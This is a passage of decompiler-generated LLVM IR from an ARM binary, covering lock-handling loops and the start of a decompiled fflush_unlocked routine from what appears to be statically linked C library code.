  %v0_16d2083 = phi i32 [ %v1_16d18.pre, %dec_label_pc_16d20.dec_label_pc_16d14_crit_edge ], [ %v2_16d08, %dec_label_pc_16d08 ]
  store i32 %v0_16d2083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d30 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d30, label %dec_label_pc_16d34, label %dec_label_pc_16d20.dec_label_pc_16d14_crit_edge

dec_label_pc_16d20.dec_label_pc_16d14_crit_edge:  ; preds = %dec_label_pc_16d20
  %v0_16d14.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d18.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16d14 = inttoptr i32 %v0_16d14.pre to i32*
  %v2_16d14 = load i32, i32* %v1_16d14, align 4
  store i32 %v2_16d14, i32* %r3.global-to-local, align 4
  %v3_16d18 = icmp uge i32 %v2_16d14, %v1_16d18.pre
  store i1 %v3_16d18, i1* %cpsr_c.global-to-local, align 1
  %v9_16d18 = icmp eq i32 %v2_16d14, %v1_16d18.pre
  br i1 %v9_16d18, label %dec_label_pc_16d20, label %dec_label_pc_16d38

dec_label_pc_16d34:                               ; preds = %dec_label_pc_16d20
  %v0_16d34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16d34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d38

dec_label_pc_16d38:                               ; preds = %dec_label_pc_16d08, %dec_label_pc_16d20.dec_label_pc_16d14_crit_edge, %dec_label_pc_16d34
  %v0_16d40 = phi i32 [ %v0_16d34, %dec_label_pc_16d34 ], [ %v2_16d1474, %dec_label_pc_16d08 ], [ %v2_16d14, %dec_label_pc_16d20.dec_label_pc_16d14_crit_edge ]
  %v1_16d38 = phi i32 [ %v0_16d34, %dec_label_pc_16d34 ], [ %v2_16d08, %dec_label_pc_16d08 ], [ %v1_16d18.pre, %dec_label_pc_16d20.dec_label_pc_16d14_crit_edge ]
  %v3_16d38 = icmp uge i32 %v0_16d40, %v1_16d38
  store i1 %v3_16d38, i1* %cpsr_c.global-to-local, align 1
  %v9_16d38 = icmp eq i32 %v0_16d40, %v1_16d38
  br i1 %v9_16d38, label %dec_label_pc_16d40, label %dec_label_pc_16d38.dec_label_pc_16d08_crit_edge

dec_label_pc_16d38.dec_label_pc_16d08_crit_edge:  ; preds = %dec_label_pc_16d38
  %v0_16d08.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d08

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16d38
  %v2_16d40 = icmp ne i32 %v1_16d38, 0
  store i1 %v2_16d40, i1* %cpsr_c.global-to-local, align 1
  %v7_16d44 = icmp slt i32 %v1_16d38, 2
  br i1 %v7_16d44, label %dec_label_pc_16d60, label %dec_label_pc_16d48

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16d40
  %v0_16d48 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16d48, i32* %r0.global-to-local, align 4
  %v0_16d4c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d4c = add i32 %v0_16d4c, 129
  store i32 %v1_16d4c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d60

dec_label_pc_16d60:                               ; preds = %dec_label_pc_16ce4, %dec_label_pc_16d48, %dec_label_pc_16d40
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16d64 = load i32, i32* %r5.global-to-local, align 4
  %v2_16d64 = add i32 %v0_16d64, 80
  %v3_16d64 = inttoptr i32 %v2_16d64 to i32*
  %v4_16d64 = load i32, i32* %v3_16d64, align 4
  store i32 %v4_16d64, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_16d6c = inttoptr i32 %v4_16d64 to i32*
  store i32 0, i32* %v2_16d6c, align 4
  br label %dec_label_pc_16d70

dec_label_pc_16d70:                               ; preds = %dec_label_pc_16be4, %dec_label_pc_16c0c, %dec_label_pc_16d60
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16d74 = load i32, i32* %r5.global-to-local, align 4
  %v2_16d74 = add i32 %v0_16d74, 160
  %v3_16d74 = inttoptr i32 %v2_16d74 to i32*
  %v4_16d74 = load i32, i32* %v3_16d74, align 4
  store i32 %v4_16d74, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16d7c = add i32 %v0_16d74, 12
  %v3_16d7c = inttoptr i32 %v2_16d7c to i32*
  %v4_16d7c = load i32, i32* %v3_16d7c, align 4
  store i32 %v4_16d7c, i32* %r1.global-to-local, align 4
  %v1_16d80 = add i32 %v4_16d74, 4
  %v2_16d80 = inttoptr i32 %v1_16d80 to i32*
  %v3_16d80 = load i32, i32* %v2_16d80, align 4
  store i32 %v3_16d80, i32* %r2.global-to-local, align 4
  %v1_16d84 = inttoptr i32 %v4_16d7c to i32*
  %v2_16d84 = load i32, i32* %v1_16d84, align 4
  %v1_16d88 = add i32 %v3_16d80, -1
  store i32 %v1_16d88, i32* %r2.global-to-local, align 4
  %v1_16d8c = add i32 %v2_16d84, -1
  store i32 %v1_16d8c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d90 = icmp eq i32 %v1_16d88, 0
  store i32 %v1_16d8c, i32* %v1_16d84, align 4
  %v0_16d98 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d98 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d98 = add i32 %v1_16d98, 4
  %v3_16d98 = inttoptr i32 %v2_16d98 to i32*
  store i32 %v0_16d98, i32* %v3_16d98, align 4
  br i1 %v2_16d90, label %dec_label_pc_16da0, label %dec_label_pc_16e00

dec_label_pc_16da0:                               ; preds = %dec_label_pc_16d70
  %v0_16da0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16da0 = load i32, i32* %r0.global-to-local, align 4
  %v2_16da0 = add i32 %v1_16da0, 8
  %v3_16da0 = inttoptr i32 %v2_16da0 to i32*
  store i32 %v0_16da0, i32* %v3_16da0, align 4
  %v0_16da4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16da4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16da8

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16dd8.dec_label_pc_16da8_crit_edge, %dec_label_pc_16da0
  %v0_16da8 = phi i32 [ %v0_16da8.pre, %dec_label_pc_16dd8.dec_label_pc_16da8_crit_edge ], [ %v0_16da4, %dec_label_pc_16da0 ]
  %v1_16da8 = inttoptr i32 %v0_16da8 to i32*
  %v2_16da8 = load i32, i32* %v1_16da8, align 4
  store i32 %v2_16da8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16da8, i32* %r2.global-to-local, align 4
  %v2_16db462 = load i32, i32* %v1_16da8, align 4
  store i32 %v2_16db462, i32* %r3.global-to-local, align 4
  %v3_16db864 = icmp uge i32 %v2_16db462, %v2_16da8
  store i1 %v3_16db864, i1* %cpsr_c.global-to-local, align 1
  %v9_16db870 = icmp eq i32 %v2_16db462, %v2_16da8
  br i1 %v9_16db870, label %dec_label_pc_16dc0, label %dec_label_pc_16dd8

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16da8, %dec_label_pc_16dc0.dec_label_pc_16db4_crit_edge
  %v0_16dc071 = phi i32 [ %v1_16db8.pre, %dec_label_pc_16dc0.dec_label_pc_16db4_crit_edge ], [ %v2_16da8, %dec_label_pc_16da8 ]
  store i32 %v0_16dc071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16dd0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16dd0, label %dec_label_pc_16dd4, label %dec_label_pc_16dc0.dec_label_pc_16db4_crit_edge

dec_label_pc_16dc0.dec_label_pc_16db4_crit_edge:  ; preds = %dec_label_pc_16dc0
  %v0_16db4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16db8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16db4 = inttoptr i32 %v0_16db4.pre to i32*
  %v2_16db4 = load i32, i32* %v1_16db4, align 4
  store i32 %v2_16db4, i32* %r3.global-to-local, align 4
  %v3_16db8 = icmp uge i32 %v2_16db4, %v1_16db8.pre
  store i1 %v3_16db8, i1* %cpsr_c.global-to-local, align 1
  %v9_16db8 = icmp eq i32 %v2_16db4, %v1_16db8.pre
  br i1 %v9_16db8, label %dec_label_pc_16dc0, label %dec_label_pc_16dd8

dec_label_pc_16dd4:                               ; preds = %dec_label_pc_16dc0
  %v0_16dd4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16dd4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16dd8

dec_label_pc_16dd8:                               ; preds = %dec_label_pc_16da8, %dec_label_pc_16dc0.dec_label_pc_16db4_crit_edge, %dec_label_pc_16dd4
  %v0_16de0 = phi i32 [ %v0_16dd4, %dec_label_pc_16dd4 ], [ %v2_16db462, %dec_label_pc_16da8 ], [ %v2_16db4, %dec_label_pc_16dc0.dec_label_pc_16db4_crit_edge ]
  %v1_16dd8 = phi i32 [ %v0_16dd4, %dec_label_pc_16dd4 ], [ %v2_16da8, %dec_label_pc_16da8 ], [ %v1_16db8.pre, %dec_label_pc_16dc0.dec_label_pc_16db4_crit_edge ]
  %v3_16dd8 = icmp uge i32 %v0_16de0, %v1_16dd8
  store i1 %v3_16dd8, i1* %cpsr_c.global-to-local, align 1
  %v9_16dd8 = icmp eq i32 %v0_16de0, %v1_16dd8
  br i1 %v9_16dd8, label %dec_label_pc_16de0, label %dec_label_pc_16dd8.dec_label_pc_16da8_crit_edge

dec_label_pc_16dd8.dec_label_pc_16da8_crit_edge:  ; preds = %dec_label_pc_16dd8
  %v0_16da8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16da8

dec_label_pc_16de0:                               ; preds = %dec_label_pc_16dd8
  %v2_16de0 = icmp ne i32 %v1_16dd8, 0
  store i1 %v2_16de0, i1* %cpsr_c.global-to-local, align 1
  %v7_16de4 = icmp slt i32 %v1_16dd8, 2
  br i1 %v7_16de4, label %dec_label_pc_16e00, label %dec_label_pc_16de8

dec_label_pc_16de8:                               ; preds = %dec_label_pc_16de0
  %v0_16de8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16de8, i32* %r0.global-to-local, align 4
  %v0_16dec = load i32, i32* %r1.global-to-local, align 4
  %v1_16dec = add i32 %v0_16dec, 129
  store i32 %v1_16dec, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16e00

dec_label_pc_16e00:                               ; preds = %dec_label_pc_16d70, %dec_label_pc_16de8, %dec_label_pc_16de0
  %v2_16e04 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16e04, i32* %r4.global-to-local, align 4
  %v1_16e08 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16e08

; uselistorder directives
  uselistorder i32 %v0_16dd4, { 1, 0, 2 }
  uselistorder i32 %v1_16db8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16da8, { 1, 0 }
  uselistorder i32 %v0_16d34, { 1, 0, 2 }
  uselistorder i32 %v1_16d18.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d08, { 1, 0 }
  uselistorder i32 %v0_16cd4, { 2, 1, 0 }
  uselistorder i32 %v0_16c78, { 1, 0 }
  uselistorder i32 %v0_16c5c, { 1, 0, 2 }
  uselistorder i32 %v1_16c40.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16c2c, { 1, 0 }
  uselistorder i32 %v0_16bd0, { 1, 0, 2 }
  uselistorder i32 %v1_16bb4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16b88, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 13, 12, 42, 14, 15, 16, 43, 44, 17, 18, 19, 20, 21, 22, 23, 25, 24, 40, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 41, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 22, 23, 5, 6, 7, 9, 8, 0, 10, 13, 11, 12, 1, 14, 15, 24, 25, 16, 17, 18, 19, 20, 26, 27, 21 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16e00, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16dd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16dc0, { 1, 0 }
  uselistorder label %dec_label_pc_16d70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16d38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d20, { 1, 0 }
  uselistorder label %dec_label_pc_16cd4, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_16c9c, { 1, 0 }
  uselistorder label %dec_label_pc_16c70, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16c60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c48, { 1, 0 }
  uselistorder label %dec_label_pc_16be4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16bd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16bbc, { 1, 0 }
}

define i32 @function_16e10(i32 %arg1) local_unnamed_addr {
dec_label_pc_16e10:
  %v0_16e10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16e10, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16e10
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16e10, %bb
  %v10_16e24 = phi i32 [ %arg1, %dec_label_pc_16e10 ], [ 0, %bb ]
  ret i32 %v10_16e24

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_16e28 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r6, align 4
  %v4_16e38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 76) to i32*), align 4
  store i32 %v4_16e38, i32* %r3.global-to-local, align 4
  %v4_16e3c = icmp uge i32 %tmp, %v4_16e38
  store i1 %v4_16e3c, i1* %cpsr_c.global-to-local, align 1
  %v10_16e3c = icmp eq i32 %tmp, %v4_16e38
  br i1 %v10_16e3c, label %bb, label %dec_label_pc_16e54

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16e64

dec_label_pc_16e54:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16e58 = icmp eq i16* %arg1, null
  br i1 %v3_16e58, label %dec_label_pc_16e64, label %dec_label_pc_17178

dec_label_pc_16e64:                               ; preds = %bb, %dec_label_pc_16e54
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16e54 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16e68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 160) to i32*), align 4
  store i32 %v4_16e68, i32* %r5.global-to-local, align 4
  %v0_16e6c = call i32 @__aeabi_read_tp()
  store i32 %v0_16e6c, i32* %r0.global-to-local, align 4
  %v1_16e70 = add i32 %v4_16e68, 8
  %v2_16e70 = inttoptr i32 %v1_16e70 to i32*
  %v3_16e70 = load i32, i32* %v2_16e70, align 4
  store i32 %v3_16e70, i32* %r3.global-to-local, align 4
  %v1_16e74 = add i32 %v0_16e6c, -1168
  store i32 %v1_16e74, i32* %r8.global-to-local, align 4
  %v3_16e78 = icmp uge i32 %v3_16e70, %v1_16e74
  store i1 %v3_16e78, i1* %cpsr_c.global-to-local, align 1
  %v9_16e78 = icmp eq i32 %v3_16e70, %v1_16e74
  br i1 %v9_16e78, label %dec_label_pc_16ec0, label %dec_label_pc_16e80

dec_label_pc_16e80:                               ; preds = %dec_label_pc_16e64
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16e68, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16e8c143 = inttoptr i32 %v4_16e68 to i32*
  %v2_16e8c144 = load i32, i32* %v1_16e8c143, align 4
  store i32 %v2_16e8c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16e90146 = icmp eq i32 %v2_16e8c144, 0
  br i1 %v9_16e90146, label %dec_label_pc_16e98, label %dec_label_pc_16eb0

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e80, %dec_label_pc_16e98.dec_label_pc_16e8c_crit_edge
  %v0_16e98147 = phi i32 [ %v1_16e90.pre, %dec_label_pc_16e98.dec_label_pc_16e8c_crit_edge ], [ 0, %dec_label_pc_16e80 ]
  store i32 %v0_16e98147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ea8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ea8, label %dec_label_pc_16eac, label %dec_label_pc_16e98.dec_label_pc_16e8c_crit_edge

dec_label_pc_16e98.dec_label_pc_16e8c_crit_edge:  ; preds = %dec_label_pc_16e98
  %v0_16e8c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16e90.pre = load i32, i32* @r4, align 4
  %v1_16e8c = inttoptr i32 %v0_16e8c.pre to i32*
  %v2_16e8c = load i32, i32* %v1_16e8c, align 4
  store i32 %v2_16e8c, i32* %r3.global-to-local, align 4
  %v3_16e90 = icmp uge i32 %v2_16e8c, %v1_16e90.pre
  store i1 %v3_16e90, i1* %cpsr_c.global-to-local, align 1
  %v9_16e90 = icmp eq i32 %v2_16e8c, %v1_16e90.pre
  br i1 %v9_16e90, label %dec_label_pc_16e98, label %dec_label_pc_16eb0

dec_label_pc_16eac:                               ; preds = %dec_label_pc_16e98
  %v0_16eac = load i32, i32* @r4, align 4
  store i32 %v0_16eac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16eb0

dec_label_pc_16eb0:                               ; preds = %dec_label_pc_16e80, %dec_label_pc_16e98.dec_label_pc_16e8c_crit_edge, %dec_label_pc_16eac
  %v0_16eb0 = phi i32 [ %v0_16eac, %dec_label_pc_16eac ], [ %v2_16e8c144, %dec_label_pc_16e80 ], [ %v2_16e8c, %dec_label_pc_16e98.dec_label_pc_16e8c_crit_edge ]
  %v1_16eb0 = phi i32 [ %v0_16eac, %dec_label_pc_16eac ], [ 0, %dec_label_pc_16e80 ], [ %v1_16e90.pre, %dec_label_pc_16e98.dec_label_pc_16e8c_crit_edge ]
  %v3_16eb0 = icmp uge i32 %v0_16eb0, %v1_16eb0
  store i1 %v3_16eb0, i1* %cpsr_c.global-to-local, align 1
  %v9_16eb0 = icmp eq i32 %v0_16eb0, %v1_16eb0
  br i1 %v9_16eb0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16eb0
  %v1_16eb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16eb4, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16eb0, %bb65
  %v1_16eb8 = xor i1 %v9_16eb0, true
  call void @__pseudo_cond_branch(i1 %v1_16eb8, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_16ebc = load i32, i32* %r8.global-to-local, align 4
  %v1_16ebc = load i32, i32* %r5.global-to-local, align 4
  %v2_16ebc = add i32 %v1_16ebc, 8
  %v3_16ebc = inttoptr i32 %v2_16ebc to i32*
  store i32 %v0_16ebc, i32* %v3_16ebc, align 4
  br label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16e64, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16ec4 = load i32, i32* @r6, align 4
  %v2_16ec4 = add i32 %v0_16ec4, 160
  %v3_16ec4 = inttoptr i32 %v2_16ec4 to i32*
  %v4_16ec4 = load i32, i32* %v3_16ec4, align 4
  store i32 %v4_16ec4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16ecc = add i32 %v0_16ec4, 12
  %v3_16ecc = inttoptr i32 %v2_16ecc to i32*
  %v4_16ecc = load i32, i32* %v3_16ecc, align 4
  store i32 %v4_16ecc, i32* %r2.global-to-local, align 4
  %v1_16ed0 = add i32 %v4_16ec4, 4
  %v2_16ed0 = inttoptr i32 %v1_16ed0 to i32*
  %v3_16ed0 = load i32, i32* %v2_16ed0, align 4
  store i32 %v3_16ed0, i32* %r1.global-to-local, align 4
  %v1_16ed4 = inttoptr i32 %v4_16ecc to i32*
  %v2_16ed4 = load i32, i32* %v1_16ed4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ed8 = icmp eq i32 %v3_16ed0, 0
  %v1_16edc = add i32 %v2_16ed4, 1
  store i32 %v1_16edc, i32* %r3.global-to-local, align 4
  store i32 %v1_16edc, i32* %v1_16ed4, align 4
  br i1 %v2_16ed8, label %dec_label_pc_16ee8, label %dec_label_pc_16f48

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16ec0
  %v0_16ee8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ee8 = load i32, i32* %r0.global-to-local, align 4
  %v2_16ee8 = add i32 %v1_16ee8, 8
  %v3_16ee8 = inttoptr i32 %v2_16ee8 to i32*
  store i32 %v0_16ee8, i32* %v3_16ee8, align 4
  %v0_16eec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16eec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16ef0

dec_label_pc_16ef0:                               ; preds = %dec_label_pc_16f20.dec_label_pc_16ef0_crit_edge, %dec_label_pc_16ee8
  %v0_16ef0 = phi i32 [ %v0_16ef0.pre, %dec_label_pc_16f20.dec_label_pc_16ef0_crit_edge ], [ %v0_16eec, %dec_label_pc_16ee8 ]
  %v1_16ef0 = inttoptr i32 %v0_16ef0 to i32*
  %v2_16ef0 = load i32, i32* %v1_16ef0, align 4
  store i32 %v2_16ef0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16ef0, i32* %r2.global-to-local, align 4
  %v2_16efc131 = load i32, i32* %v1_16ef0, align 4
  store i32 %v2_16efc131, i32* %r3.global-to-local, align 4
  %v3_16f00133 = icmp uge i32 %v2_16efc131, %v2_16ef0
  store i1 %v3_16f00133, i1* %cpsr_c.global-to-local, align 1
  %v9_16f00139 = icmp eq i32 %v2_16efc131, %v2_16ef0
  br i1 %v9_16f00139, label %dec_label_pc_16f08, label %dec_label_pc_16f20

dec_label_pc_16f08:                               ; preds = %dec_label_pc_16ef0, %dec_label_pc_16f08.dec_label_pc_16efc_crit_edge
  %v0_16f08140 = phi i32 [ %v1_16f00.pre, %dec_label_pc_16f08.dec_label_pc_16efc_crit_edge ], [ %v2_16ef0, %dec_label_pc_16ef0 ]
  store i32 %v0_16f08140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f18 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f18, label %dec_label_pc_16f1c, label %dec_label_pc_16f08.dec_label_pc_16efc_crit_edge

dec_label_pc_16f08.dec_label_pc_16efc_crit_edge:  ; preds = %dec_label_pc_16f08
  %v0_16efc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f00.pre = load i32, i32* @r4, align 4
  %v1_16efc = inttoptr i32 %v0_16efc.pre to i32*
  %v2_16efc = load i32, i32* %v1_16efc, align 4
  store i32 %v2_16efc, i32* %r3.global-to-local, align 4
  %v3_16f00 = icmp uge i32 %v2_16efc, %v1_16f00.pre
  store i1 %v3_16f00, i1* %cpsr_c.global-to-local, align 1
  %v9_16f00 = icmp eq i32 %v2_16efc, %v1_16f00.pre
  br i1 %v9_16f00, label %dec_label_pc_16f08, label %dec_label_pc_16f20

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16f08
  %v0_16f1c = load i32, i32* @r4, align 4
  store i32 %v0_16f1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f20

dec_label_pc_16f20:                               ; preds = %dec_label_pc_16ef0, %dec_label_pc_16f08.dec_label_pc_16efc_crit_edge, %dec_label_pc_16f1c
  %v0_16f28 = phi i32 [ %v0_16f1c, %dec_label_pc_16f1c ], [ %v2_16efc131, %dec_label_pc_16ef0 ], [ %v2_16efc, %dec_label_pc_16f08.dec_label_pc_16efc_crit_edge ]
  %v1_16f20 = phi i32 [ %v0_16f1c, %dec_label_pc_16f1c ], [ %v2_16ef0, %dec_label_pc_16ef0 ], [ %v1_16f00.pre, %dec_label_pc_16f08.dec_label_pc_16efc_crit_edge ]
  %v3_16f20 = icmp uge i32 %v0_16f28, %v1_16f20
  store i1 %v3_16f20, i1* %cpsr_c.global-to-local, align 1
  %v9_16f20 = icmp eq i32 %v0_16f28, %v1_16f20
  br i1 %v9_16f20, label %dec_label_pc_16f28, label %dec_label_pc_16f20.dec_label_pc_16ef0_crit_edge

dec_label_pc_16f20.dec_label_pc_16ef0_crit_edge:  ; preds = %dec_label_pc_16f20
  %v0_16ef0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16ef0

dec_label_pc_16f28:                               ; preds = %dec_label_pc_16f20
  %v2_16f28 = icmp ne i32 %v1_16f20, 0
  store i1 %v2_16f28, i1* %cpsr_c.global-to-local, align 1
  %v7_16f2c = icmp slt i32 %v1_16f20, 2
  br i1 %v7_16f2c, label %dec_label_pc_16f48, label %dec_label_pc_16f30

dec_label_pc_16f30:                               ; preds = %dec_label_pc_16f28
  %v0_16f30 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16f30, i32* %r0.global-to-local, align 4
  %v0_16f34 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f34 = add i32 %v0_16f34, 129
  store i32 %v1_16f34, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f48

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16ec0, %dec_label_pc_16f30, %dec_label_pc_16f28
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16f4c = load i32, i32* @r6, align 4
  %v2_16f4c = add i32 %v0_16f4c, 152
  %v3_16f4c = inttoptr i32 %v2_16f4c to i32*
  %v4_16f4c = load i32, i32* %v3_16f4c, align 4
  store i32 %v4_16f4c, i32* %r5.global-to-local, align 4
  %v1_16f50 = add i32 %v4_16f4c, 8
  %v2_16f50 = inttoptr i32 %v1_16f50 to i32*
  %v3_16f50 = load i32, i32* %v2_16f50, align 4
  store i32 %v3_16f50, i32* %r3.global-to-local, align 4
  %v1_16f54 = load i32, i32* %r8.global-to-local, align 4
  %v3_16f54 = icmp uge i32 %v3_16f50, %v1_16f54
  store i1 %v3_16f54, i1* %cpsr_c.global-to-local, align 1
  %v9_16f54 = icmp eq i32 %v3_16f50, %v1_16f54
  br i1 %v9_16f54, label %dec_label_pc_16f9c, label %dec_label_pc_16f5c

dec_label_pc_16f5c:                               ; preds = %dec_label_pc_16f48
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16f4c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16f68123 = inttoptr i32 %v4_16f4c to i32*
